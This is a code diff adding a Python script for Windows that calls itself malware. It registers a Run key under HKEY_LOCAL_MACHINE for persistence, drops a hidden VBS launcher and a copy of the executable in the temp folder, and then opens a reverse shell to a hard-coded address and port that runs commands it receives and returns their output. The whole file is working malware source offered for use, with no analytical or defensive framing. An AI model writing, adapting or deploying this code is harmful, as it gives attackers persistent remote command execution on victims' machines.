@@ -1,0 +1,76 @@
+import os
+import sys
+import socket
+import subprocess
+import tempfile
+from _winreg import *
+
+MALWARE_NAME = "malware.exe"
+TRIGGER = MALWARE_NAME.replace('.exe','')+".vbs"
+KEY_PATH = "Software\Microsoft\Windows\CurrentVersion\Run"
+KEY_NAME = "PyCk"
+IP = "192.168.1.5" # IP for use in reverse shell
+PORT = 1337 # Port for use in reverse shell
+TRIGGER_PATH = tempfile.gettempdir()+"\\"+TRIGGER
+MALWARE_PATH = tempfile.gettempdir()+"\\"+MALWARE_NAME
+
+class My_malware():
+
+    def infect_windows_register_keys(self):
+        """ Register malware on windows keys.
+            Returns False if didn't have key for malware.
+            Returns True if already have key for malware. """
+        key = OpenKey(HKEY_LOCAL_MACHINE, KEY_PATH)
+        keys = []
+        try:
+            i=0
+            while True:
+                cur_key = EnumValue(key, i)
+                keys.append(cur_key[0])
+                i+=1
+        except:
+            pass
+        if KEY_NAME not in keys:
+            mlwr_key = OpenKey(HKEY_LOCAL_MACHINE, KEY_PATH, 0, KEY_ALL_ACCESS)
+            SetValueEx(mlwr_key, KEY_NAME, 0, REG_SZ, TRIGGER_PATH)
+            mlwr_key.Close()
+            return False
+        return True
+
+    def hide_malware_and_trigger(self):
+        """ Generate and hide the trigger and malware.
+            Return True if was alredy hided.
+            Return False if wasnt hided """
+        if os.path.exists(MALWARE_PATH) and os.path.exists(TRIGGER_PATH):
+            return True
+        else:
+            payload = 'Set WshShell = WScript.CreateObject("WScript.Shell")\nWshShell.Run """{0}""", 0 , false'.format(MALWARE_PATH)
+            with open(TRIGGER_PATH, 'w') as f:
+                f.write(payload)
+            os.system('copy %s %s'%(MALWARE_NAME, MALWARE_PATH))
+            return False
+
+    def reverse_shell(self):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((IP,PORT))
+        s.send('\n For exiting use quit command.\n\n')
+        while True:
+            data = s.recv(1024)
+            if "quit" in data:
+                break
+            cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            saida_cmd = cmd.stdout.read() + cmd.stderr.read()
+            s.send(saida_cmd)
+            s.send("CMD> ")
+        s.close()
+
+def main():
+    res = []
+    x = My_malware()
+    res.append(x.infect_windows_register_keys())
+    res.append(x.hide_malware_and_trigger())
+    if all(res is True for res in res):
+        x.reverse_shell()
+
+if __name__ == '__main__':
+    main()
